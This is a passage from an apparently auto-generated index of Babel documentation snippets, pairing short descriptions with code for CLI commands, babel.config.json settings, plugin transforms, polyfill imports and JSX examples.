\"jsx\",\n    \"flow\",\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: CommonJS Output Example\nDESCRIPTION: This is the compiled CommonJS output generated by the plugin from the ES module example. It demonstrates how the default export is transformed into setting a property on the `exports` object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nObject.defineProperty(exports, \"__esModule\", {\n  value: true,\n});\n\nexports.default = 42;\n```\n\n----------------------------------------\n\nTITLE: Transform for-of Loop (Input)\nDESCRIPTION: This JavaScript code demonstrates a simple for-of loop that iterates over the elements of an array named 'foo'. The plugin transforms this modern syntax into ES5 compatible code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfor (var i of foo) {\n}\n```\n\n----------------------------------------\n\nTITLE: Ignore Babel Configuration Files\nDESCRIPTION: Compiles `script.js` to `script-compiled.js`, ignoring any `.babelrc` or `.babelrc.json` configuration files, and applies the specified presets (@babel/preset-env and @babel/preset-react).  The `--no-babelrc` option disables the use of configuration files.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_17\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel --no-babelrc script.js --out-file script-compiled.js --presets=@babel/preset-env,@babel/preset-react\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Asynchronously\nDESCRIPTION: Shows how to use `babel.transformFile` to asynchronously transform the contents of a file. It takes the filename, options, and a callback.  The callback receives an error object and a result object containing the transformed code, source map, and AST. Requires @babel/core and file system access.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFile(filename, options, callback);\n```\n\n----------------------------------------\n\nTITLE: Babel CLI: Changing Output File Extension\nDESCRIPTION: This shell command demonstrates using the `--out-file-extension` flag in the Babel CLI to specify the extension of the output files. It's used to transform `.js` files into `.cjs` files, which is commonly needed when working with ECMAScript modules in Node.js and generating CommonJS output.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ babel src --out-dir lib-cjs --out-file-extension cjs\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json\nDESCRIPTION: This JSON configuration enables the `@babel/plugin-transform-literals` plugin. The plugin must be installed as a dependency. The `babel.config.json` file is the main configuration file for Babel, allowing to specify which plugins to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-literals.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Plugin and Options - JSON\nDESCRIPTION: Shows how to configure the @babel/plugin-transform-runtime plugin with specific options in a babel.config.json file.  It includes settings for absoluteRuntime, corejs, helpers, regenerator, and version. Adjust these options to tailor the plugin's behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"absoluteRuntime\": false,\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"version\": \"7.0.0-beta.0\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Running Babel CLI with root-mode\nDESCRIPTION: This snippet shows how to run the Babel CLI with the `root-mode` option set to `upward`. This configuration instructs Babel to search for the babel.config.json file by traversing up the directory tree from the current working directory, ensuring that the monorepo's root configuration is used even when running Babel from within a subpackage.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --root-mode upward src -d lib\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Transformed a.js\nDESCRIPTION: The transformed `a.js` file after Babel processes it with `useBuiltIns: 'usage'`. It imports the `es.promise` polyfill from core-js if Promises are not supported in the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es.promise\";\nvar a = new Promise();\n```\n\n----------------------------------------\n\nTITLE: Explicit Resource Management Async Usage (JavaScript)\nDESCRIPTION: Demonstrates asynchronous disposal using `await using` in Explicit Resource Management. The `db` connection is automatically closed asynchronously at the end of the block.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  await using db = await Database.connect(\"//my-db.sql\");\n  db.query(\"INSERT INTO tools (name, version) VALUES ('Babel', '7.22.0')\");\n} // At the end of the block, the db connection will be closed asynchronously\n```\n\n----------------------------------------\n\nTITLE: Install Exponentiation Operator Plugin npm\nDESCRIPTION: This command installs the @babel/plugin-transform-exponentiation-operator as a development dependency using npm. This plugin transforms the exponentiation operator to Math.pow().\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-exponentiation-operator.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-exponentiation-operator\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Core-js Example (Before)\nDESCRIPTION: Shows the original JavaScript code using modern built-ins (Symbol, Promise, Array.includes) that requires polyfills to function in older environments. This code would require a global polyfill without the transform-runtime plugin and `corejs` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar sym = Symbol();\n\nvar promise = Promise.resolve();\n\nvar check = arr.includes(\"yeah!\");\n\nconsole.log(arr[Symbol.iterator]());\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with preset-env\nDESCRIPTION: This JSON configuration file, `babel.config.json`, sets up Babel with the `@babel/preset-env` preset. `@babel/preset-env` automatically determines the necessary Babel plugins and transforms based on the target environment. This simplifies Babel configuration and ensures compatibility with a wide range of environments.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Example Input\nDESCRIPTION: This TypeScript code snippet demonstrates a simple variable declaration with a type annotation. It showcases the input to be transformed by @babel/preset-typescript.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nconst x: number = 0;\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack Babel Loader\nDESCRIPTION: This snippet configures the `babel-loader` for Webpack with the `rootMode` option set to `upward`. This setting makes sure that Babel uses the root babel.config.json file when compiling modules with Webpack, regardless of the current working directory.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule: {\n  rules: [\n    {\n      loader: \"babel-loader\",\n      options: {\n        rootMode: \"upward\",\n      },\n    },\n  ];\n}\n```\n\n----------------------------------------\n\nTITLE: Plugin Ordering Example\nDESCRIPTION: This snippet illustrates the order in which plugins are executed. Plugins are executed from first to last. In this example transform-decorators-legacy will be executed before transform-class-properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"transform-decorators-legacy\", \"transform-class-properties\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin Transform Runtime (JSON)\nDESCRIPTION: This snippet illustrates how to configure the `@babel/plugin-transform-runtime` plugin in `babel.config.json`.  It demonstrates how to enable the plugin, which handles code transformations during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_13\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-runtime\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage - JavaScript\nDESCRIPTION: Demonstrates how to use the @babel/plugin-transform-runtime plugin with the Babel Node API.  The transformSync function from @babel/core is used to transform the input 'code' string with the specified plugin. Requires @babel/core to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-runtime\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Helper Example (After)\nDESCRIPTION: Demonstrates the transformation of a class declaration using the transform-runtime plugin. The `_classCallCheck` helper is imported from `@babel/runtime/helpers`, avoiding code duplication. This example illustrates how the plugin replaces inlined helper functions with imports from the `@babel/runtime/helpers` module, thus reducing code duplication.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nvar _classCallCheck2 = require(\"@babel/runtime/helpers/classCallCheck\");\n\nvar _classCallCheck3 = _interopRequireDefault(_classCallCheck2);\n\nfunction _interopRequireDefault(obj) {\n  return obj && obj.__esModule ? obj : { default: obj };\n}\n\nvar Person = function Person() {\n  (0, _classCallCheck3.default)(this, Person);\n};\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugins\nDESCRIPTION: This snippet demonstrates how to specify Babel plugins in the babel.config.json file. It shows how to include plugins by name, assuming they are installed in node_modules. The plugins option takes an array of plugin names.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"babel-plugin-myPlugin\", \"@babel/plugin-transform-runtime\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Overrides in Babel\nDESCRIPTION: This example demonstrates how to use the `overrides` option in Babel configuration to apply specific settings based on file path. It sets the `compact` option to `true` for a specific minified JavaScript file, optimizing the output for that file only.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\noverrides: [{\n  test: \"./vendor/large.min.js\",\n  compact: true,\n}]\n```\n\n----------------------------------------\n\nTITLE: Decorator Auto Accessors in Babel 8\nDESCRIPTION: Shows how to utilize decorator auto accessors in Babel 8. This feature enables declarative property observation and modification.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nclass Example { @reactive accessor myBool = false; }\n```\n\n----------------------------------------\n\nTITLE: Do Expression vs Ternary Operator\nDESCRIPTION: Demonstrates how a `do` expression can be used as a more complex alternative to the ternary operator.  It evaluates a condition and assigns a value to the variable `a` based on the result. Requires JavaScript runtime environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet a = do {\n  if (x > 10) {\n    (\"big\");\n  } else {\n    (\"small\");\n  }\n};\n// is equivalent to:\nlet a = x > 10 ? \"big\" : \"small\";\n```\n\n----------------------------------------\n\nTITLE: Destructuring Example: Output JavaScript\nDESCRIPTION: This JavaScript code shows the output after the destructuring transformation by the Babel plugin. It illustrates how the destructuring assignment is converted into compatible code using intermediate variables and helper functions like `_toArray` and `slice`. The goal is to support destructuring in environments lacking native support.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _toArray(arr) { ... }\n\nlet _obj = obj,\n    x = _obj.x,\n    y = _obj.y;\n\nlet _arr = arr,\n    _arr2 = _toArray(_arr),\n    a = _arr2[0],\n    b = _arr2[1],\n    rest = _arr2.slice(2);\n```\n\n----------------------------------------\n\nTITLE: Environment-Specific Babel Configuration (JSON)\nDESCRIPTION: This JSON configuration showcases how to set environment-specific options for the @babel/preset-react preset within a babel.config.json file, enabling the development option only in the 'development' environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-react\"],\n  \"env\": {\n    \"development\": {\n      \"presets\": [[\"@babel/preset-react\", { \"development\": true }]]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Default Parameters in JavaScript\nDESCRIPTION: Demonstrates the use of default parameter values in ES2015 functions. This allows specifying default values for function parameters, which are used if the corresponding arguments are not provided or are passed as `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction f(x, y=12) {\n  // y is 12 if not passed (or passed as undefined)\n  return x + y;\n}\nf(3) == 15\n```\n\n----------------------------------------\n\nTITLE: Stripping Flow Type Annotations (JavaScript)\nDESCRIPTION: This JavaScript snippet demonstrates how Babel can be used to strip Flow type annotations from JavaScript code. It defines a function `square` with a Flow type annotation for the input parameter `n` and the return type.  Babel, with the flow preset, will remove the `: number` annotations.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// @flow\nfunction square(n: number): number {\n  return n * n;\n}\n```\n\n----------------------------------------\n\nTITLE: Babel 7 config for record/tuple migration\nDESCRIPTION: This code snippet shows a Babel 7 configuration for transforming record/tuple syntax in a large scale migration. It includes necessary parser options, the `@babel/plugin-proposal-record-and-tuple` plugin with specified syntax type and import polyfill, and configurations for JSX and TypeScript syntax support.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"babelrc\": false,\n  \"configFile\": false,\n  \"generateOpts\": {\n    \"experimental_preserveFormat\": true,\n    \"retainLines\": true,\n    \"tokens\": true\n  },\n  \"parserOpts\": {\n    \"createParenthesizedExpressions\": true\n  },\n  \"plugins\": [\n    \"@babel/plugin-syntax-jsx\",\n    \"@babel/plugin-syntax-typescript\",\n\n    // or syntaxType: \"bar\" if you are using `{||}` or `[||]`\n    [\"@babel/plugin-proposal-record-and-tuple\", {\n      \"syntaxType\": \"hash\", \"importPolyfill\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Polyfilling Instance Methods with core-js 3 in JavaScript\nDESCRIPTION: This code snippet demonstrates how to polyfill instance methods using @babel/plugin-transform-runtime and core-js@3, allowing them to be used in older browsers without polluting the global environment. It requires @babel/plugin-transform-runtime and core-js@3 as dependencies. The input is a JavaScript expression using an instance method and the output is the transformed code using the runtime core-js3 instance property.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// 'foo' could be either a string or an array, or a custom object\nfoo.includes(\"a\");\n\n// ⮕\n\nimport _includesInstanceProperty from \"@babel/runtime-corejs3/core-js-stable/instance/includes\";\n\n_includesInstanceProperty(foo).call(foo, \"a\");\n```\n\n----------------------------------------\n\nTITLE: Configure plugin with options (Babel 8)\nDESCRIPTION: Shows how to configure the @babel/plugin-transform-react-jsx-development plugin in a babel.config.json file with custom options such as `throwIfNamespace`, `runtime`, and `importSource`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-react-jsx-development\",\n      {\n        \"throwIfNamespace\": false, // defaults to true\n        \"runtime\": \"automatic\", // defaults to autoamtic\n        \"importSource\": \"custom-jsx-library\" // defaults to react\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Is Required Example Plugin JavaScript\nDESCRIPTION: Demonstrates how plugin authors can leverage the `isRequired` function to optimize plugin output based on different compilation targets. The example plugin replaces `a.b` with `a != null && a.b` or `a?.b` depending on optional chaining support in the targets.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// a naive plugin replace `a.b` to `a != null && a.b`\nmodule.exports = api => {\n  const targets = api.targets();\n  // The targets have native optional chaining support\n  // if `transform-optional-chaining` is _not_ required\n  const optionalChainingSupported = !isRequired(\n    \"transform-optional-chaining\",\n    targets\n  );\n  const visited = new WeakSet();\n  return {\n    visitor: {\n      MemberExpression(path) {\n        if (path.matchesPattern(\"a.b\")) {\n          if (visited.has(path.node)) return;\n          visited.add(path.node);\n          if (optionalChainingSupported) {\n            // When optional chaining is supported,\n            // output `a?.b` instead of `a != null && a.b`\n            path.replaceWith(api.templates`a?.b`);\n          } else {\n            path.replaceWith(api.templates`a != null && ${path.node}`);\n          }\n        }\n      },\n    },\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage (With Options)\nDESCRIPTION: Demonstrates how to enable the plugin in a Babel configuration file with options.  Here, the 'loose' mode option is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-classes\", {\n      \"loose\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel configuration file (babel.config.js)\nDESCRIPTION: This JavaScript configuration file defines the presets used by Babel for transforming JavaScript code when using an older Babel version. It sets the `@babel/preset-env` to target specific browser versions (Edge 17, Firefox 60, Chrome 67, Safari 11.1) and includes settings for `useBuiltIns` and `corejs` to handle polyfilling based on usage.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst presets = [\n  [\n    \"@babel/preset-env\",\n    {\n      targets: {\n        edge: \"17\",\n        firefox: \"60\",\n        chrome: \"67\",\n        safari: \"11.1\",\n      },\n      useBuiltIns: \"usage\",\n      corejs: \"3.6.4\",\n    },\n  ],\n];\n\nmodule.exports = { presets };\n```\n\n----------------------------------------\n\nTITLE: Accessing Deeply Nested Properties in JavaScript\nDESCRIPTION: Shows how to use the optional chaining operator to safely access deeply nested properties in an object, preventing errors when intermediate properties are null or undefined. It demonstrates using both dot and bracket notation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst obj = {\n  foo: {\n    bar: {\n      baz: 42,\n    },\n  },\n};\n\nconst baz = obj?.foo?.bar?.baz; // 42\n\nconst safe = obj?.qux?.baz; // undefined\n\n// Optional chaining and normal chaining can be intermixed\nobj?.foo.bar?.baz; // Only access `foo` if `obj` exists, and `baz` if\n// `bar` exists\n\n// Example usage with bracket notation:\nobj?.[\"foo\"]?.bar?.baz; // 42\n```\n\n----------------------------------------\n\nTITLE: Polyfill Import with `useBuiltins: 'usage'` - JavaScript\nDESCRIPTION: These code examples illustrate how `babel-preset-env` with `useBuiltins: 'usage'` intelligently imports only the necessary polyfills based on the code's usage, optimizing the bundle size. It demonstrates how specific features, such as `Promise` and `Array.includes`, trigger the import of corresponding polyfill modules.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-12-27-nearing-the-7.0-release.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es6.promise\";\nvar a = new Promise();\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es7.array.includes\";\n[].includes\na.includes\n```\n\n----------------------------------------\n\nTITLE: Installation: Install Babel Plugin via npm\nDESCRIPTION: Installs the `@babel/plugin-transform-member-expression-literals` plugin as a development dependency using npm.  This is required before using the plugin in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-member-expression-literals.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/plugin-transform-member-expression-literals --save-dev\n```\n\n----------------------------------------\n\nTITLE: Import core-js for polyfilling\nDESCRIPTION: This code snippet demonstrates how to import `core-js/stable` directly to polyfill ECMAScript features.  This approach is recommended as of Babel 7.4.0 instead of using `@babel/polyfill`. It ensures that necessary polyfills are included in the project. No specific parameters or dependencies beyond core-js itself are required.\nSOURCE: https://github.com/babel/website/blob/main/docs/polyfill.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/stable\";\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'entry' - Transformed CoreJS import\nDESCRIPTION: Illustrates the output after Babel transforms the `import \"core-js\"` statement with `useBuiltIns: 'entry'`. The output varies based on the target environment and core-js version, with specific polyfill modules being imported. This example shows polyfills for string padding.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es.string.pad-start\";\nimport \"core-js/modules/es.string.pad-end\";\n```\n\n----------------------------------------\n\nTITLE: Example Babel Plugin (JavaScript)\nDESCRIPTION: This JavaScript code defines a simple Babel plugin that reverses the names of all identifiers in the code.  It exports a function that takes a `types` object as input and returns an object with a `visitor` property.  The `Identifier` visitor method reverses the name of each identifier node.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n// A plugin is just a function\nexport default function({ types: t }) {\n  return {\n    visitor: {\n      Identifier(path) {\n        let name = path.node.name; // reverse the name: JavaScript -> tpircSavaJ\n        path.node.name = [...name]\n          .reverse()\n          .join(\"\");\n      },\n    },\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with defaults in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option to use the `defaults` query from browserslist. This allows Babel to target the browsers defined by the `defaults` query.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": \"defaults\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Function Bind Usage JavaScript\nDESCRIPTION: Demonstrates a basic example of using the function bind syntax to call a method on an object with a different `this` context. Includes chained function calls using the bind operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst box = {\n  weight: 2,\n  getWeight() {\n    return this.weight;\n  },\n};\n\nconst { getWeight } = box;\n\nconsole.log(box.getWeight()); // prints '2'\n\nconst bigBox = { weight: 10 };\nconsole.log(bigBox::getWeight()); // prints '10'\n\n// Can be chained:\nfunction add(val) {\n  return this + val;\n}\n\nconsole.log(bigBox::getWeight()::add(5)); // prints '15'\n```\n\n----------------------------------------\n\nTITLE: Replacing @babel/polyfill with core-js and regenerator-runtime in JavaScript\nDESCRIPTION: This example demonstrates how to replace the deprecated `@babel/polyfill` with direct imports of `core-js` and `regenerator-runtime/runtime`. This approach provides more control over the versions of these packages used in your project and allows for independent updates.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// before\nimport \"@babel/polyfill\";\n\n// after\nimport \"core-js/stable\";\nimport \"regenerator-runtime/runtime\";\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Browser\nDESCRIPTION: This snippet demonstrates how to switch from the standard JSX transformer to Babel for in-browser JSX transformation. It involves changing the script type from 'text/jsx' to 'text/babel'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<script type='text/jsx'></script>\n```\n\n----------------------------------------\n\nTITLE: Compile Directory\nDESCRIPTION: Compiles all files in the `src` directory and outputs the compiled files to the `lib` directory, preserving the directory structure. The `--out-dir` option specifies the output directory.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib\n```\n\n----------------------------------------\n\nTITLE: React Automatic Runtime Example (JSX to JS)\nDESCRIPTION: Demonstrates how JSX is transformed into JavaScript using the automatic runtime, where the necessary functions are automatically imported from 'react/jsx-runtime'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { jsx as _jsx } from \"react/jsx-runtime\";\nimport { jsxs as _jsxs } from \"react/jsx-runtime\";\n\nconst profile = _jsxs(\"div\", {\n  children: [\n    _jsx(\"img\", {\n      src: \"avatar.png\",\n      className: \"profile\",\n    }),\n    _jsx(\"h3\", {\n      children: [user.firstName, user.lastName].join(\" \"),\n    }),\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Installing React Preset (Shell)\nDESCRIPTION: This shell command demonstrates how to install the @babel/preset-react preset using npm or yarn.  The --save-dev flag ensures that the preset is installed as a development dependency.  This is a prerequisite for using Babel to transpile JSX.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-react\n```\n\n----------------------------------------\n\nTITLE: Compile Directory with Extensions\nDESCRIPTION: Compiles files in the `src` directory with specified extensions (.ts, .js, .tsx, .jsx, .cjs, .mjs) to the `lib` directory, using specified presets.  Presets are used to transpile different types of files.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib \\\n  --extensions .ts,.js,.tsx,.jsx,.cjs,.mjs \\\n  --presets=@babel/preset-typescript,@babel/preset-env,@babel/preset-react\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Plugin Configuration with Options (JSON)\nDESCRIPTION: Example babel.config.json file showing how to configure the @babel/plugin-transform-react-jsx plugin with specific options such as `throwIfNamespace`, `runtime`, and `importSource`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_10\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-react-jsx\",\n      {\n        \"throwIfNamespace\": false, // defaults to true\n        \"runtime\": \"automatic\", // defaults to autoamtic\n        \"importSource\": \"custom-jsx-library\" // defaults to react\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Remove isTSX and add plugin-syntax-jsx - JSON\nDESCRIPTION: This code snippet demonstrates how to remove the `isTSX` option from `@babel/plugin-syntax-typescript` and add `@babel/plugin-syntax-jsx` to the plugins array in `babel.config.json`. This configuration is necessary when `isTSX: true` was previously used.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-syntax-typescript\"],\n    [\"@babel/plugin-syntax-jsx\"]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: JSX Component Example (JSX)\nDESCRIPTION: This JSX snippet defines a React component that simulates a dice roll. It utilizes the useState hook to manage the dice number and a handleClick function to generate a new random number when the button is clicked. The component renders the current dice roll and a button to trigger a new roll.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nexport default function DiceRoll(){\n  const getRandomNumber = () => {\n    return Math.ceil(Math.random() * 6);\n  };\n\n  const [num, setNum] = useState(getRandomNumber());\n\n  const handleClick = () => {\n    const newNum = getRandomNumber();\n    setNum(newNum);\n  };\n\n  return (\n    <div>\n      Your dice roll: {num}.\n      <button onClick={handleClick}>Click to get a new number</button>\n    </div>\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Arrow Function Transformation Example (In)\nDESCRIPTION: Demonstrates the input JavaScript code containing arrow functions that will be transformed by the Babel plugin. It showcases various arrow function syntax, including those with implicit and explicit returns, and those used within objects and array methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = () => {};\nvar a = b => b;\n\nconst double = [1, 2, 3].map(num => num * 2);\nconsole.log(double); // [2,4,6]\n\nvar bob = {\n  _name: \"Bob\",\n  _friends: [\"Sally\", \"Tom\"],\n  printFriends() {\n    this._friends.forEach(f => console.log(this._name + \" knows \" + f));\n  },\n};\nconsole.log(bob.printFriends());\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage - Shell\nDESCRIPTION: Illustrates how to use the @babel/plugin-transform-runtime plugin via the Babel CLI.  This command compiles 'script.js' using the plugin.  Ensure Babel CLI is installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins @babel/plugin-transform-runtime script.js\n```\n\n----------------------------------------\n\nTITLE: Installing Babel CLI\nDESCRIPTION: This command installs both the core Babel library (@babel/core) and the Babel CLI tool (@babel/cli) as development dependencies. This setup allows using Babel from the command line.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/core @babel/cli\n```\n\nLANGUAGE: shell\nCODE:\n```\n./node_modules/.bin/babel src --out-dir lib\n```\n\n----------------------------------------\n\nTITLE: Configuring the Plugin (JSON)\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file. The 'plugins' array specifies the plugins to be used during the transformation process. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_2\n\nLANGUAGE: 